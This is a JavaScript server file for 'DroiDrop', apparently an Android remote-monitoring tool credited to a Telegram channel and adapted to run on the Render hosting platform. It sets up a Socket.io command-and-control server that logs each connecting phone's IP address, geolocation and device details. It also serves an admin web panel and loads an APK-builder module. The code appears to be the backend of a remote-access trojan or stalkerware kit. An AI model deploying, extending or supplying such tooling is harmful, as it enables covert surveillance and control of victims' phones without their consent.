/* * DroiDrop (Modified for Render)
* An Android Monitoring Tools
* By t.me/efxtv
*/

const
    express = require('express'),
    app = express(),
    http = require('http').Server(app), // إنشاء سيرفر HTTP لدمج الأداة
    IO = require('socket.io')(http),    // ربط Socket.io بسيرفر الويب
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

// إعداد المنفذ ليتوافق مع Render
const PORT = process.env.PORT || 10000;

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// إعدادات الاتصال (Socket.io)
IO.sockets.pingInterval = 30000;
IO.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);    
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }
});

// إعدادات واجهة الإدارة والمسارات
app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

// تشغيل السيرفر الموحد على منفذ Render
http.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
